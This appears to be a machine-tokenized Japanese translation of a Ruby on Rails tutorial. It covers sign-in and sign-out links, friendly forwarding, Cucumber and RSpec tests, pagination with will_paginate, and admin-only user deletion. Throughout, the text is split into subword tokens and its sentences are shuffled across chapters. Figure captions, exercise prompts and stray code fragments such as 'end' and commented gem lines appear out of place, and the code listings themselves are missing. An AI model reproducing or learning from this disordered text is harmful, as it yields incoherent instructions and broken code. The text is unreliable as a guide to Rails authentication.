▁ サインイン / サインアウト が 動作する ように なり 、 実 用 的な アプリケーション ら しく な っ てきました 。 今度は 、 サインイン の 状態 に合わせて レイアウト 上の リンク が 変わる ように しましょう 。
▁ サイト レイアウト の リンク を変更する には 、 埋め込み Ruby の 内 側 で if - else 分 岐 構造 を使用します 。
▁# ▁ サインイン している ユーザー 用の リンク
▁# サインイン していない ユーザー 用の リンク
▁ この種の コード では 、\ ko de { signed _ in ?} ▁ 論理値 が 必要 になります ので 、 これ から 定義 しましょう 。
▁ ユーザーが サインイン している 状態 は 、 セッション に 現在のユーザー が いる ▁(\ ko de { current _ user } が \ ko de { nil } でない ) ▁ ことで 表 されます 。
▁{0} 図 9 . 6 {/0} {1} 保 護 された ページ にアクセス した 直 後 の サインイン フォーム 。 \ href { http :// railstutorial . org / images / figure s / protected _ sign _ in _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ これを 表現 するには 否 定 の 演算子 が 必要な ので 、\ ko de { ! } ▁( " b an g " ▁ と 読み ます ) ▁ を使用します 。
▁self を省略した 結果を リスト \ ref { code : signed _ in _ p } に示します 。
▁ 当 然 の ことです が 、 サインイン を 要求 する だけで は 十分 ではありません 。 ユーザーが \ emph { 自分自身 の } 情報 以外の 他 ユーザーの 情報を 編集 できない ように する 必要 もあります 。
▁\ ko de { edit } アクション と \ ko de { update } アクション で 正しい ユーザーを 要求 すること をテストする 。
▁\ ko de { signed _ in ?} メソッドを 手 作り して あるので 、 レイアウト の リンク は すぐ に 作成 できます 。
▁Rails では 、 この ユーザー への 直接 リンク が 許 される ので 、 この場合 \ ko de { current _ user } は \ ko de { user _ path ( current _ user ) } に 自動 的 に変換 されます 。
▁ 新しい リンクを レイアウト に追加する ときに 、 Bootstrap の 機能 を使用して ド ロ ッ プ ダ ウ ン メニュー を 実現 しましょう 。 詳 細 については 「\ href { http :// get bootstrap . com / 2 . 3 . 2 / com p on ent s . html } { Bootstrap コンポーネント } ▁( 英語 )」 を参照してください 。
▁なお 、 ファクトリー では 以下の オプション を使用できます 。
▁ これはリスト \ ref { code : layout _ signin _ sign out _ links } で使用されていま した 。
▁上のコードは 、 作成する ユーザーの メールアドレスを デフォルト と 異なる もの に変更 します 。
▁ このコード では 、 Bootstrap の ド ロ ッ プ ダ ウ ン メニュー に 関連する CSS の id と クラス が与えられ ていることに注目してください 。
▁この テストでは 、 元の ユーザーが 別の ユーザーの \ ko de { edit } アクション や \ ko de { update } アクション にアクセス できない ことを確認します 。
▁ サインイン している ユーザー 用 に リンク を変更する 。
▁このコードは \ ko de { update } アクション でも 同様 で した 。
▁しかし 既に \ ko de { correct _ user } ▁ before _ filter で \ ko de {@ user } を定義し たので 、 update アクション と edit アクション から このコード を 削除 できました 。
▁ 以下 を実行して テストスイート が パス する ことを確認 して から 先に 進 む ことにしましょう 。
▁{0} 図 8 .9{/0} {1} サインイン した ユーザーに リンク と ド ロ ッ プ ダ ウ ン が表示される ようになった 。 \ href { http :// railstutorial . org / images / figure s / profile _ with _ sign out _ link _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ この時点で 、 ブラウザで 実際に サインイン できる ことを確認 し 、 続いて ブラウザを閉じ て から 再度 サンプルアプリケーション を表示する と サインイン した ま ま になっている ことを確認 してください 。
▁ 別の 言 い 方 を すれば 、 ログ オン していない ユーザーが 編集 ページ にアクセス し よう として いた なら 、 ユーザーが サインイン した 後に は その 編集 ページに リダイレクト される ように する の が 望 ま しい 動作 です 。
▁{0} 図 8 . 10 {/0} {1} ローカル の ブラウザで 記憶トークン の cookies を表示する 。 \ href { http :// railstutorial . org / images / figure s / cookie _ in _ browser - full . png }{( 拡大 ) }{/1}
▁ このような 動作 を ▁“ フ レ ンド リ ー フ ォ ワ ー デ ィ ング ” ▁ と呼びます が 、 これ をテストする には 次のような 手順 を 踏 み ます 。 まず ユーザーの edit ページ にアクセス し 、 その後 サインイン ページに リダイレクト します 。
▁ 認 証 機能 の 基本的な 部分 は できました が 、 ユーザーが 登録 を 行った 後 、 その ユーザーが デフォルトで は サインイン して お らず 、 このままでは ユーザーが 混 乱 する 可能性があります 。
▁ そこで 、 サインアウト の 機能 を実装する 前に その 部分を もう少し 作り 込 みましょう 。
▁ それ から 正しい サインイン 情報を 入力 し 、[ S ig n ▁in ] ▁ ボタン を クリック します 。
▁ サインイン 後に リダイレクト される のは ユーザーの プロファイル ページ ですが 、 この場合は も とも と ▁" Edit ▁ user " ▁ ページ にアクセス し よう として いた のです から 、 その ページに リダイレクト する ようにします 。
▁ これはリスト \ ref { code : friend ly _ forwarding _ test } で使用されていま した 。
▁ 新規ユーザー 登録 後に ユーザーが サインイン した こと をテストする 。
▁上のコードでは 、 ユーザー登録 後に サインイン している ことを確認 するために 、 サインアウト 用の リンク が表示されている かどうかを テスト しています 。
▁ いよいよ 実装 です
▁ ユーザー登録 後に サインアップ する 。
▁ ユーザーを 希 望 の ページに 転 送 するには 、 リクエスト 時点 の ページを ど こ か に保存 しておき 、 その 場所 に リダイレクト させる 必要があります 。
▁この節では 、 その サインアウト 機能 を追加します 。
▁ Sessions コントローラのアクション は 、 これまで も RESTful 慣 例 に従って サインイン ページに は \ ko de { new } を使用し 、 サインイン の 完了 には \ ko de { create } を使用し ました 。
▁ 今回 も同様に 慣 例 に従い 、 セッション の 削除 ▁( サインアウト ) ▁ には \ ko de { destroy } を使用します 。
▁ユーザーの サインアウト をテストする 。
▁\ ko de { store _ location } メソッドを 、 サインイン した ユーザーの before _ filter に追加する 。
▁ セッション を削除する ▁( ユーザーの サインアウト )。
▁ sign _ out
▁ 他の 認 証 用 機能 と同様に 、\ ko de { sign _ out } も Sessions ヘルパー モジュール の中に 置 きます 。
▁ Sessions ヘルパー モジュール の \ ko de { sign _ out } メソッド 。
▁ これはリスト \ ref { code : friend ly _ session _ create } で使用されていま した 。
▁これで ユーザー登録 / サインイン / サインアウト が すべて 揃 い ました 。 テストスイート は パス するはずです 。
▁ いつものように 、 以下 を実行して テストスイート が 緑色 ▁( 成功 ) ▁ になる ことを確認 して から 先に 進 みましょう 。
▁ 本書 の テストスイート は 認証システム を ほぼ カ バー しています が 、 すべて を カ バー している わけではありません 。 この 点 を ご 了 承 ください 。
▁たとえば 、[ この アカウント 設定 を保存する ] ▁ の ▁ cookies ▁( remember ▁ me ) ▁ が 有効 になっている か 、 その後 も 保 持 されている かどうか のテスト は 含 まれ て いません 。
▁この テストは 作成 可能です が 、 著者 の 経験 上 、 cookies の値 を直接 調 べ る 方法は Rails の実装 に 左 右 され やすい 傾 向 があり 、 次の バージョンの Rails では また 変わる かもしれません 。
▁その 際 、 データベースに サンプルデータ を追加する 方法 や 、 将来 ユーザー 数 が 膨 大 になって も index ページを 問題 なく 表示 できるように するための ユーザー 出力 の \ emph { ページネーション ▁( pagination = ページ 分割 ) } ▁ の 方法 を 学 び ます 。
▁その 場合 、 アプリケーション コードは 正常に動作し ても テストが 正常に動作し なくなります 。
▁ このような 理由 で 、 本書 の テストコード では 、 コア となる アプリケーション コード をテストする 際に 高度な 機能 ▁( ユーザーが サインイン できる こと 、 ページ 移動 後 も サインイン している こと 、 サインアウト できる こと ) ▁ に 重 点 を 置 き 、 重要 性 の 低 い 機能 は 必ず し も 含 んで いません 。
▁ サンプルアプリケーションの 認証システム の基礎 部分 が 無 事 完成 した ので 、 この 機 会 に \ href { http :// c u ke s . info } { Cucumber } を使用した サインイン のテスト 方法 を ご 紹 介 します 。 Cucumber は 振 舞 駆 動 開発 用の ツール として 有 名 で 、 Ruby コ ミ ュ ニ テ ィ に 多くの 愛 用 者 が います 。
▁{0} 図 9 . 7 {/0} {1} ページネーション と ▁[ Users ] ▁ リンクを 実装 した ユーザーの インデックス ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / user _ index _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ユーザーの \ ko de { show } ページ については 、 今後 も ▁( サインイン している かどうか に か か わ らず ) ▁ サイト を 訪 れ た すべての ユーザー から 見え るように しておきます が 、 ユーザー \ ko de { index } ページ は サインイン した ユーザーに しか 見 せ ないように し 、 未 登録 の ユーザーが デフォルトで 表示 できる ページを 制限 します 。
▁ この節 の内容 は 必 須 ではありません ので 、 スキップ しても 問題 ありません 。
▁ Cucumber を使用すると 、 アプリケーションの 振る舞い を テキスト ベース の 「\ emph { スト ー リ ー }」 で 定義 することができます 。
▁self を省略した 結果を リスト \ ref { code : protected _ index _ test } に示します 。
▁ 多くの Rails プ ログ ラ マ ー は 、 Cucumber は 顧 客 と 共 同 作業 するときに 便 利 であることを 知 っています 。 Cucumber の スト ー リ ー は 、 専 門 知 識 の ない 人 でも 読 む ことができ 、 スト ー リ ー を 顧 客 と 共有 したり 、 場合によっては 顧 客 が スト ー リ ー を作成する こと す ら できる ためです 。
▁\ ko de { index } アクション が 保 護 されている こと をテストする 。
▁もちろん 、 テスティング の フレームワーク が 純 粋 な Ruby でない という 点 は 残 念 でも あり 、 著者 にとって は テキスト ベース の スト ー リ ー は い さ さ か 冗 長 な 面 も ある と 思 わ れ ます 。
▁ それ でも Cucumber は Ruby の テスティング ツール キ ッ ト として 確 固 た る 地 位 を 占 め ており 、 著者 として は 低 レベル の実装 を 気 に すること なく 高度な 振る舞い を 記述 できる 点が 特に 気 に 入 っています 。
▁ 本書 では RSpec と Capybara を テスティング の メ イン に 据 え ている ので 、 この節 の Cucumber に関する 説明 は 完 全 ではなく 、 表 面 的 で 物 足 り ない ことでしょう 。
▁ この節 の 目的 は Cucumber の お い し さ ▁( 間 違 い なく シ ャ キ シ ャ キ して 汁 気 た っ ぷ り です ) ▁ を 知 って も ら う ための 、 い わ ば 試 食 です 。 も し 気 に 入 って いた だけ たら 、 テスティング ツール に関する 完 結 した 書 籍 が い く つ もあります 。
▁\ text tt { c u c um b er - rails } ▁gem を \ ko de { Gemfile } に追加する 。
▁self を省略した 結果を リスト \ ref { code : signed _ in _ user _ index } に示します 。
▁\ ko de { index } アクション で ユーザーの サインイン を 要求 する 。
▁ アプリケーションで Cucumber を使用する ための 設定 を行う ために 、 次 は 必要な サポート 用 ファイル と ディレクトリ を生成します 。
▁上の コマンド により 、 Cucumber 関連 の ファイルが 置 か れる \ ko de { f e at ur es / } ディレクトリ が 作成されます 。
▁ 次の 一 連 の テストでは 、 サインイン した ユーザー から 見 た インデックス ページに 、 タイトル と コンテンツ と サイトの すべての ユーザー が正しく 表示 されている ことを確認します 。
▁ Cucumber では 、\ href { https :// github . com / c u c um b er / g her k in } { G her k in } ▁( キ ュ ウ リ 属 の 植 物 : ▁ ガ ー キ ン ) ▁ と呼ばれる テキスト ベース の 言語 を使用して 、 アプリケーションに 期 待 される 振る舞い を 記述 します 。
▁このメソッド では 、 3 つの ファクトリー ユーザー ▁( 最初の 1 人 として サインイン します ) ▁ を作成し 、 インデックス ページに 表示 されている それぞれの ユーザーに リスト 要素 ▁(\ ko de { li }) ▁ タグ が与えられ ている ことを確認します 。
▁ G her k in で 書かれ た テストは 、 ち ゃ ん と 書かれ た RSpec の例 と同じ ぐらい 読み や す く でき ています 。 どちら も テキスト ベース であり 、 自 然 な 英語 に 近 く Ruby コード よりも 読み やすい ためです 。
▁self を省略した 結果を リスト \ ref { code : user _ index _ tests } に示します 。
▁このコードは リスト \ ref { code : initial _ failing _ signin _ test } で使用されていま した 。 もうひとつ 、
▁ユーザーの インデックス ページ のテスト 。
▁最初に 、\ ko de { f e at ur es / } ディレクトリ 内に \ ko de { sign ing _ in . f e at ur e } という ファイル を作成します 。
▁ Cucumber の フ ィ ー チ ャ ー ファイルは 、 以下のように その 機能 の 簡単な 説明 から 始 まり ます 。
▁次に 個 別の \ emph { シ ナ リ オ } を追加します 。
▁たとえば 、 サインイン 失敗 をテストする には 、 以下のような シ ナ リ オ を作成します 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ 同様に 、 サインイン 成功 をテストする ために 以下 を使用できます 。
▁ これはリスト \ ref { code : signin _ f e at ur es } で使用されていま した 。
▁ユーザーの サインイン をテストする Cucumber の フ ィ ー チ ャ ー ファイル 。
▁ 実際の インデックス ページ を作成する には 、 ユーザーを 列 挙 して ユーザー ごとに \ ko de { li } タグ で 囲 む ビュー を 作成する必要があります 。
▁これらの フ ィ ー チ ャ ー を実行する には 、\ ko de { c u c um b er } 実行 ファイルを 以下のように 実行 します 。
▁リスト \ ref { code : user _ index _ view } では 、\ ref { code : gravatar _ option } の 演習 の リスト \ ref { sec : signup _ exercises } の 結果を 利用 しています 。 これは 、 Gravatar ヘルパー に デフォルト 以外の サイズ を指定する オプションを 渡します 。
▁ ここ から お わかり だ と思います が 、 Cucumber は RSpec と同様 Rake タスク から 呼 び 出 す こともできます 。
▁(\ ko de { rake ▁c u c um b er : o k } と 書く こともできます )。
▁ まだ テキスト を 書いた だけ なので 、 当 然 ながら このままでは Cucumber の シ ナ リ オ は テストにパス しません 。
▁ テストスイート が 緑色 ▁( 成功 ) ▁ になる ためには 、 テキスト ファイルを Ruby コード に マ ッ プ する \ emph { ステップ } ファイル を作成します 。
▁ ステップ ファイルは \ ko de { f e at ur es / st e p _ de f in it ions } ディレクトリ に置き ます 。 ファイル名 は ここでは \ ko de { authentication _ st e p s . rb } とします 。
▁[ Users ] ▁ リンク 用の URL 。
▁\ ko de { F e at ur e } 行 と \ ko de { S ce n ar io } 行 は 説明 の ためのものです が 、 それ以外の 行 は Ruby に 対応 付け られ る必要があります 。
▁たとえば 、 フ ィ ー チ ャ ー ファイル にある 以下のコード は 、
▁以下の ステップ 定義 によって 扱 わ れ ます 。
▁ フ ィ ー チ ャ ー ファイル の中で は \ ko de { G ive n } は 単なる 文字列 ですが 、 ステップ ファイル の中で は \ ko de { G ive n } は \ emph { メソッド } であり 、 正規表現 と ブロック を 引数に 取り ます 。
▁この 正規表現 は シ ナ リ オ の 中 の 行 と マッチ し 、 次の ブロック の内容 は 、 その ステップ を実装する ために 必要な Ruby のコード です 。
▁ この場合 、 “ a ▁ user ▁ v is it s ▁the ▁ signin ▁ page ” という 記述 は 以下のコード によって 実装 されます 。
▁上のコードは ど こ か で 見 た こと がある と 思 った ら 、 それ も その は ず 、 Capybara です 。 Capybara はデフォルトで Cucumber の ステップ ファイルに 含 まれ ます 。
▁ 次の 2 行 も わかり やすい と思います 。
▁上の フ ィ ー チ ャ ー ファイル のコードは 、 ステップ ファイル では 以下のように 扱 わ れ ます 。
▁ 最初の ステップ でも Capybara が 使用 されています が 、 その 次の ステップ では Capybara の \ ko de { page } オブジェクト と RSpec が 併 用 されています 。 見 て の とおり 、 RSpec と Capybara で 行える テストは 、 すべて Cucumber でも 行 え ます 。
▁ 残 り の ステップ も同様に 進め られます 。
▁ これはリスト \ ref { code : authentication _ st e p s } で使用されていま した 。
▁ ステップ を追加した ら 、 以下 を実行します 。
▁以上で ユーザー インデックス ページ は 完全に 機能 する ようになりました ので 、 以下の テスト はすべて パス するはずです 。
▁ テストにパス する まで これを 繰り返し ます 。
▁ サインイン フ ィ ー チ ャ ー が パス するための 完全な ステップ 定義 。
▁{0} 図 9 . 8 {/0} {1} ユーザー インデックス ページ \ href { http :// localhost :3000/ users }{/ users } に ユーザーが 1 人 しか 表示 されていない 。 \ href { http :// railstutorial . org / images / figure s / user _ index _ only _ one _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 簡単な Cucumber の シ ナ リ オ を いくつか 紹 介 した ので 、 それら と 同 等 の RSpec の例 と 比 較 してみましょう 。
▁このコードは リスト \ ref { code : signin _ f e at ur es } で使用されていま した 。 もうひとつ 、
▁次に 、 サンプル ユーザー を作成する Rake タスク を追加します 。
▁次に 、 以下の RSpec リクエスト spec ▁( 結合 テスト ) ▁ を見てみましょう 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁( ここ は 若 干 高度な 内容 ですが 、 今 は 詳 細 を理解する 必要はありません )。
▁ データベースに サンプル ユーザー を追加する Rake タスク 。
▁ Cucumber と 結合 テスト で それぞれ どのように 実装 されている か が お わかり いた だけ る と思います 。
▁ Cucumber の フ ィ ー チ ャ ー は 非常に 読み やすい のですが 、 その 代 わ り 実装 されている コード から 完全に 切り 離 されて いて 、 両 刃 の 剣 です 。
▁ 著者 にとって 、 Cucumber は 読み やすい が 書く のは 面倒 、 結合 テストは プ ログ ラ マ ー にとって は それ ほど 読み や す く ない 代わりに 書く のは \ emph { は る か に } 楽 、 という 印 象 です 。
▁ Cucumber では フ ィ ー チ ャ ー と ステップ が 分 離 されている ことにより 、 抽 象 度 の 高 い 記述 が 可能 である という 効果 があります 。
▁このコードは \ ko de { db : p o p ul at e } タスク を定義し ます 。 この タスク は 、 それら しい 名前 と メールアドレス を持つ 99 のユーザー を作成し 、 従来 のユーザー と 置き換え ます 。
▁\ ko de { User . create ! } を実行する 前に 、 Rake タスク が User モデル などの ローカル の Rails 環境 にアクセス できるようにします 。
▁ こう しておく と より 多くの メッセージ を 生成 でき 、 サ イ レ ン ト エラー を 回 避 できる ので デバッグ が 容易に なります 。
▁以下の フ ィ ー チ ャ ー は 、 エラーメッセージ が表示される は ず である ということ を 記述 しています 。
▁ そして 以下の ステップ ファイル では 、 この テストを 実装 しています 。
▁これ が 特に 便利な のは 、 実装 に 依 存 する の が 2 番目の 要素 である ステップ ファイル だけ である 点 です 。 そのため 、 たとえば エラーメッセージ を表示する ための CSS を変更 しても 、 フ ィ ー チ ャ ー ファイルは 変更 不要です 。
▁( 最初の いくつかの サンプル アドレス については 、 デフォルトの Gravatar 画像 以外の 写 真 を 関連付け て み ました )。
▁ 同様に 、 以下のような コードを 何 度 も 書く のは 多くの 人 にとって 苦 痛 だ と思います 。
▁{0} 図 9 .9{/0} {1} ユーザー インデックス ページ \ href { http :// localhost :3000/ users }{/ users } に 100 人 の サンプル ユーザー が表示されている 。 \ href { http :// railstutorial . org / images / figure s / user _ index _ all _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 本当に 行 いた い のは 、 その ページ で エラーメッセージ が表示される ことを 示す こと の はずです 。
▁ しか も 、 上の 記 法 は 実装 に 密 着 している ので 、 実装 が変更され たら それら も すべて 変更 が 必要 になります 。
▁ 純 粋 な RSpec では 、\ emph { カスタム マッチ ャ ー } を使用して この問題 を 解決 することができます 。 カスタム マッチ ャ ー を使用すると 、 上のコード を 以下のように 簡潔 に 記述 することができます 。
▁ コード 自体 は以下のようになります 。
▁ 同様に 、 よく 使われ る 操作 を ヘルパーメソッド として 定義 することもできます 。
▁この 方法は 、 Cucumber の ステップ 定義 よりも 柔 軟 であること が わ か っ てきました 。 特に 、 マッチ ャ ー や sh o ul d ヘルパー が \ ko de { valid _ signin ( user ) } のように 引数 を 自 然 に 取 ることができます 。
▁\ text tt { will _ paginate } ▁gem は 広 く 使用 されて いて 実 績 も あるので 、 徹 底 的に テスト する必要はありません 。 ここでは 簡単な テスト を行う ことにします 。
▁ ステップ 定義 は 正規表現 マッチ ャ ー によって 繰り返す ことができます が 、 この 手法 は 一般に 厄 介 な もの になり やすい という 印 象 です 。
▁最初に 、\ ko de { div } タグ の CSS ▁class ▁ が ▁“ pagination ” になっている こと をテストします 。 これは \ text tt { will _ paginate } によって 出力 されます 。
▁ ヘルパーメソッド と カスタム RSpec マッチ ャ ー を追加する 。
▁次に 、 結果 の最初の ページに 正しい ユーザー が表示されている ことを確認します 。
▁その ためには \ ko de { paginate } メソッド が必要です 。 このメソッド については この後 説明します 。
▁ テスト と サイトの 実装 を 結 び つ け る 方法 の例 は 他にも 多 数 あります 。
▁ 以前 と同様 、 Factory ▁Girl を使用して ユーザーを シ ミ ュ レ ート する ことにします が 、 ここで 早 く も 問題が生じ ます 。 ユーザーの メールアドレス は 一意 でない と い け ません が 、 この ま まだ と 手 作業 で 30 人 もの メールアドレス を作成し なければなりません 。
▁ それ に 、 ユーザー名 も すべて 異なる もの に しておく 方が テスト の 際に 便利です 。
▁ 本 章では 多くの 分 野 を カ バー し 、 約 束 ど お り 、 かつ て 未 成 熟 だ った アプリケーションを 、 ユーザー登録 と ログイン を フル 装 備 した Web サイトに 変 身 させ ました 。
▁ 幸 い 、 この問題 は Factory ▁Girl の \ emph { s equ en ce s } メソッドを使用して 解決 できます 。
▁ 認 証 機能を 完成 させる ためには 、 サインイン の 状態 と ユーザー id に基いて ページの アクセス に 制限 を与える 必要 もあります 。
▁次に リモート の GitHub リポジトリ と Heroku の 本番 サーバー に プッシュ します 。
▁\ ko de { form _ for } の代わりに \ ko de { form _ tag } を使用して 、 サインイン フォーム を リファクタリング してください 。
▁これ に 代 え て 、 以下のように \ ko de { s equ en ce } メソッドを使用して 一 連 の名前 と メールアドレスを 列 挙 します 。
▁ テストスイート が 以前 と同様に パス すること も 確認 してください 。
▁\ ko de { s equ en ce } メソッドの 引数に は 、 使用 したい 属性 に対応する シンボル ▁(\ ko de { : name } ▁ など ) ▁ を使用し 、\ ko de { n } という 変数 を持つ ブロック を 1 つ 置 きます 。
▁\ emph { ヒント } : ▁ RailsCast の 「\ href { http :// rails casts . com / e p is odes / 27 0 - authentication - in - rails - 3 - 1 } { Rails ▁ 3.1 における 認 証 } ▁( 英語 )」 を参照してください 。 特に 、\ ko de { params } ハッシュの 構造 の 変更 に 注目してください 。
▁続いて \ ko de { Factory G ir l } メソッド を実行します 。
▁\ emph { 課 外 活 動 : } ▁ サポート コードを 独 立 した ファイル と モジュール に 再 編 成 し 、 spec ヘルパー ファイル で それらの モジュール を 適切に インクルード して すべて 動作 するようにしてください 。
▁ これはリスト \ ref { code : factor y _ s equ en ce } で使用されていま した 。
▁ Factory ▁Girl で シ ー ケ ン ス を定義する 。
▁ ファクトリー の シ ー ケ ン ス という 考え を 応 用 して 、 テスト 用 に 30 人のユーザー を作成します 。 ページネーション を行う には これ で 十分 です 。
▁ここで \ ko de { before (: all ) } を使用して 、 ブロック にある すべての テスト の 前に サンプル ユーザーを \ emph { 一 括 } 作成する ように し ていることに注目してください 。
▁これは 、 ユーザーを 30 人 も 作成する と システム によって は 速 度 が 低 下 すること があり 、 それ を防ぐ ためのものです 。
▁これ と 対 になる \ ko de { after (: all ) } を使用して 、 完了 後 ユーザー をすべて 削除 します 。
▁ これはリスト \ ref { code : will _ paginate _ test } で使用されていま した 。
▁ ページネーション のテスト 。
▁{0} 図 9 . 10 {/0} {1} ユーザー インデックス ページ ▁\ href { http :// localhost :3000/ users }{/ users } で の ページネーション 。 \ href { http :// railstutorial . org / images / figure s / user _ index _ pagination _ rails _ 3 _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ テスト も パス するはずです 。
▁ インデックス ビューで 最初の リファクタリング を行う 。
▁これ に 限 らず 、 リファクタリング を行う 場合には 、 アプリケーションの コード を変更する 前 と 後 で 必ず テスト を実行し 、 いずれ も 緑色 ▁( 成功 ) ▁ になる ことを確認 するようにしてください 。
▁しかし その 前に 、 削除 を 実行 できる 権限 を持つ 管理 ユーザーの クラス を作成し ましょう 。
▁{0} 図 9 . 12 {/0} {1} 削除リンク を追加した ユーザー インデックス のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / user _ index _ delete _ links _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 特 権 を持つ 管理 ユーザーを 識 別 するために 、 論理値 を と る \ ko de { admin } 属性を User モデル に追加します 。 この後 で説明します が 、 こう すると 自動的に \ ko de { admin ?} メソッド ▁( 論理値 を返す ) ▁ も 使えるようになります ので 、 これ を使用して 管理 ユーザーの 状態 を テスト できます 。
▁ これはリスト \ ref { code : admin _ spec s } で使用されていま した 。
▁\ ko de { admin } 属性 に対するテスト 。
▁また 、 以下の行 にも 注目してください 。
▁これは ユーザー に対して \ ko de { admin ?} メソッド ▁( 論理値 を返す ) ▁ が 使用できる 必要がある ことを ▁( RSpec の 論理値 慣習 に基いて ) ▁ 示 しています 。
▁これで 、 admin テストは パス するはずです 。
▁ サンプルデータ 生成 コード に 管理者 を 1 人 追加 する
▁次に データベース を リセット し 、 サンプルデータ を 再度 生成 します 。
▁ 削除 機能 をテストする には 、 管理者 を作成する ファクトリー がある と 便利です 。
▁self を省略した 結果を リスト \ ref { code : admin _ factor y } に示します 。
▁ 管理 ユーザー 向け の ファクトリー を追加する 。
▁ 私 た ち の セキュリティ モデル では 、 一 般 ユーザーに はこの 削除リンク を表示し ないように します 。
▁ 逆 に 管理 ユーザーに はこの 削除リンク が表示され 、 この リンクを クリック することで その ユーザーが 管理 ユーザー によって 削除 され 、\ ko de { User } カウント が \ ko de { - 1 } だけ 変わる ことが 期 待 されます 。
▁上のコード には \ ko de { match : ▁: first } という 記述 があります 。 これは 、\ emph { どの } 削除リンク を クリック するか は 問 わ ないこと を Capybara に 伝 え ます 。 これにより Capybara は 、 最初に 見つけ た リンクを 単 に クリック する ようになります 。
▁この テスト には 、 管理者 自身 を削除する ための リンク が 管理者 に 表示 されていない ことを確認する テスト も 含 まれ ている ことに注意してください 。
▁ これはリスト \ ref { code : delete _ link _ tests } で使用されていま した 。
▁ 削除リンク のテスト 。
▁{0} 図 9 . 14 {/0} {1} ユーザー インデックス \ href { http :// localhost :3000/ users }{/ users } に 削除リンク が表示されている 。 \ href { http :// railstutorial . org / images / figure s / index _ delete _ links _ rails _ 3 _ bootstrap - full . png }{( 拡大 ) }{/1}
▁なお 、 このとき 、\ ko de { : destroy } ▁ も ▁\ ko de { signed _ in _ user } ▁ の ▁ before _ action ▁ に追加 しています 。
▁ サイト を 正しく 防 衛 するには 、\ ko de { destroy } アクションに も アクセス 制 御 を行う 必要があります 。 そこで 、 管理者 は ユーザーを削除 \ emph { できる } が 一 般 ユーザー は \ emph { できない } ことを テスト で 確認 しましょう 。
▁ 変更 の 結果を リスト \ ref { code : delete _ destroy _ test } に示します 。
▁\ ko de { destroy } アクション の 保 護 のテスト 。
▁ 原 則 に 従 えば 、 ここに はまだ 小さな セキュリティ ホ ー ル が 残 っています 。 管理者 が や ろ う と 思 えば 、\ text tt { DELETE } リクエストを コマンドライン で 直接 発 行 して 自分自身 を 削除 できてしまいます 。
▁この アプリケーション コード では before _ filter を使用しています が 、 ここでは \ ko de { destroy } アクション から 管理者 への アクセス を 制限 するのに 使用している ことに 気 付 いた 方 も いる かもしれません 。
▁ ここ まで く れば 、 すべての テストは パス するはずです 。 そして Users リソース と Users コントローラ 、 User モデル 、 Users ビュー も 今 や 完全に 動作します 。
▁ あ の 頃 は ユーザー登録 す ら ありません で した が 、 今 は 登録 も サインイン も サインアウト も できます 。 プロファイル の 表示 も 、 設定 の 編集 も 、 すべての ユーザーの インデックス ページ もあります 。 一部の ユーザー は 他の ユーザーを削除 すること す ら できるようになりました 。
▁これらの 章では 、\ ko de { has _ many } や \ ko de { has _ many ▁ through } を使用した データモデル など 、 Rails の 最も 強力な 機能を い く つ も 紹 介 します 。
▁( システム 環境 に 依 存 する 可能性 のある gem は コメントアウト されています 。
▁ 自分の 環境で 動作する のであれば 、 それらの gem の 行 を コメント 解 除 しても 構 いません 。 )
▁# ▁ The ▁ following ▁ option al ▁ line s ▁are ▁ part ▁of ▁the ▁ advance d ▁ setup .
▁# ▁gem ▁' guard - rspec ', ▁' 2 . 5 . 0 '
▁# ▁gem ▁' guard - s p or k ', ▁' 1 . 5 . 0 '
▁# ▁gem ▁' ch il d process ', ▁' 0 . 3 . 6 '
▁# ▁gem ▁' w in 3 2 console ', ▁' 1 . 3 . 2 ' < n > ▁# ▁gem ▁' w d m ', ▁' 0 . 1 . 0 '
▁ テストは 最 初 は 赤 色 ▁( 失敗 ) 、 次に 緑色 ▁( 成功 ) ▁ になる ように してください
▁(\ emph { ヒント } : ▁最初に 、\ ko de { user _ params } の 許可 リスト に \ ko de { admin } を \ emph { 追加 } する必要があります )。
▁ 現 状 の 認 証 テストでは 、 ユーザーが サインイン すると ▁[ Pro file ] ▁ や ▁[ S e tt ing s ] ▁ などの リンク は 表示される ことを チェック しています 。
▁その 逆 に 、 ユーザーが サインイン していない とき は これらの リンク が 表示 \ emph { され ない } ことを確認する テスト も 追加 してください 。
▁また 、 それぞれの フォーム は \ emph { 完全に 同じ では ない } ため 、 テスト も 更新 の 必要があります 。 フォームの わずか な 違 い を見つけ 出 し 、 テスト の 更新 に それ を 反 映 してください 。
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング で 、 最初に 与えられた URL に のみ 確 実 に 転 送 されている ことを確認する テスト を作成 してください 。
▁ 続けて サインイン を 行った 後 、 転 送 先 の URL は デフォルト ▁( ユーザー プロファイル ページ ) ▁ に 戻 る 必要 もあります ので 、 これ も テスト で 確認 してください 。
▁ パーシャル を使用した new ユーザー ビュー 。
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング の 後 、 転 送 先 が デフォルト ページに 変わる ことを確認する テスト 。
▁end
▁また 、 エラーメッセージ に \ ko de { " In valid "} という 単 語 が含まれ ている ことも テスト します 。
▁ これら を 合わせ ると 、 次の フォームの 要素 を探し だ して テストが 行われます 。
▁ここで の ね ら い は 、 ブラウザ に この base 64 トークン を 保存 しておき 、 データベースに は トークン を 暗号化 した もの を保存する ことです 。
▁ そして 、 cookies から この トークン を 読み だ して 暗号化 し 、 データベース 上 にある 暗号化 された 記憶トークン と 一致する もの がある かどうか を検索する ことにより 、 ユーザーを 自動的に サインイン させる ことができます 。
▁ 暗号化 した トークン だけ をデータベースに保存する 理由 は 、 万 が 一 データベース が 不 正 アクセス を 受け る ようなこと が あって も 、 攻撃者が 記憶トークン を使用して サインイン できない ように する ためです 。
▁Active ▁Record で サポート される コールバック の 種類 の詳細については 、 Rails ▁ G u id es の 「\ href { http :// guides . rubyonrails . org / v 3.1 . 23 / active _ record _ validations _ c all b ack s . html } { コールバック について } ▁( 英語 )」 を参照してください 。
